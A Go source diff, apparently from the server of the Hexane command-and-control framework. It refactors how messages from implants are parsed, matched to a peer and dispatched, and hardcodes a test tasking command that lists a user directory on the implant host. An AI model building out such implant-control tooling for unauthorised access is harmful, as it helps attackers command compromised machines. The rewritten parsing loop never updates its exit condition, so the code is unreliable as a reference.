@@ -1,7 +1,6 @@
 package main
 
 import (
-	"encoding/binary"
 	"fmt"
 	"strings"
 )
@@ -74,9 +73,6 @@ func (h *HexaneConfig) HandleCommand(Parser *Message, Stream *Stream) {
 	defer h.mu.Unlock()
 
 	Stream.CreateHeader(Parser, TypeTasking, uint32(h.TaskCounter))
-	// at this point, the TypeTasking response body either has returned data or null
-	// if the data is null, simply send commands. If it's not null, print the data
-
 	Parser.DispatchCommand(h, Stream, "dir C:/Users/lemur") // user command interface
 
 	if debug {
@@ -87,88 +83,68 @@ func (h *HexaneConfig) HandleCommand(Parser *Message, Stream *Stream) {
 	WrapMessage("DBG", fmt.Sprintf("task request: %d", Parser.PeerId))
 }
 
-func (h *HexaneConfig) ParseMessage(body []byte) ([]byte, error) {
+func ParseMessage(body []byte) ([]byte, error) {
 	var (
-		rsp []byte
-		err error
+		err     error
+		Parser  *Message
+		implant *HexaneConfig
+		stream  = new(Stream)
 	)
 
-	WrapMessage("DBG", "decrypted bytes: ")
-	if debug {
+	for body != nil {
+		fmt.Println("message body: ")
 		PrintBytes(body)
-	}
 
-	stream := new(Stream)
-	Parser := CreateParser(body)
+		Parser = CreateParser(body)
 
-	switch Parser.MsgType {
-	case TypeCheckin:
-		{
-			WrapMessage("DBG", "incoming message is a checkin")
-			h.HandleCheckin(Parser, stream)
-			break
-		}
-	case TypeTasking:
-		{
-			WrapMessage("DBG", "incoming message is a task request")
-			h.HandleCommand(Parser, stream)
-			break
-		}
-	case TypeResponse:
-		{
-			WrapMessage("DBG", "incoming message is the main header")
+		Parser.PeerId = Parser.ParseDword()
+		Parser.TaskId = Parser.ParseDword()
+		Parser.MsgType = Parser.ParseDword()
 
-			if rsp, err = MessageRoutine(Parser.Buffer); err != nil {
-				stream.Buffer = []byte("200 ok")
-			} else {
-				stream.Buffer = rsp
+		fmt.Printf("peer id: %d\n", Parser.PeerId)
+		fmt.Printf("task id: %d\n", Parser.TaskId)
+		fmt.Printf("message type: %d\n", Parser.MsgType)
+
+		if implant = GetConfigByPeerId(Parser.PeerId); implant != nil {
+
+			WrapMessage("DBG", fmt.Sprintf("found peer %d. Parsing message...", Parser.PeerId))
+			implant.TaskCounter++
+		
+			switch Parser.MsgType {
+			case TypeCheckin:
+				{
+					WrapMessage("DBG", "incoming message is a checkin")
+					implant.HandleCheckin(Parser, stream)
+					break
+				}
+			case TypeTasking:
+				{
+					WrapMessage("DBG", "incoming message is a task request")
+					implant.HandleCommand(Parser, stream)
+					break
+				}
+			case TypeResponse:
+				{
+					WrapMessage("DBG", "incoming message is a response with data")
+					// print response
+				}
+			case TypeSegment:
+				{
+					WrapMessage("DBG", "incoming message is a segment with data")
+					// this will loop and do nothing.
+				}
+			default:
+				{
+					WrapMessage("ERR", fmt.Sprintf("unknown message type: 0x%X", Parser.MsgType))
+					stream.Buffer = []byte("200 ok")
+					break
+				}
 			}
-			break
+		} else {
+			WrapMessage("ERR", "could not find peer in the database")
+			stream.Buffer = []byte("ok")
 		}
-	case TypeSegment:
-		{
-			// this will loop and do nothing.
-		}
-	default:
-		{
-			WrapMessage("ERR", fmt.Sprintf("unknown message type: 0x%X", Parser.MsgType))
-			stream.Buffer = []byte("200 ok")
-			break
-		}
-	}
-
-	WrapMessage("DBG", "outgoing message : ")
-	if debug {
-		PrintBytes(stream.Buffer)
 	}
 
 	return stream.Buffer, err
-}
-
-func MessageRoutine(body []byte) ([]byte, error) {
-	var (
-		implant *HexaneConfig
-		rsp     []byte
-		err     error
-	)
-
-	WrapMessage("DBG", "incoming message body: ")
-	if debug {
-		PrintBytes(body)
-	}
-
-	pid := body[:4]
-	if implant = GetConfigByPeerId(binary.BigEndian.Uint32(pid)); implant != nil {
-		WrapMessage("DBG", fmt.Sprintf("found peer %d. Parsing message...", pid))
-
-		if rsp, err = implant.ParseMessage(body); err != nil {
-			rsp = []byte("ok")
-			return nil, err
-		}
-	} else {
-		WrapMessage("ERR", fmt.Sprintf("could not find %d in database", pid))
-		rsp = []byte("ok")
-	}
-
-	return rsp, err
 }
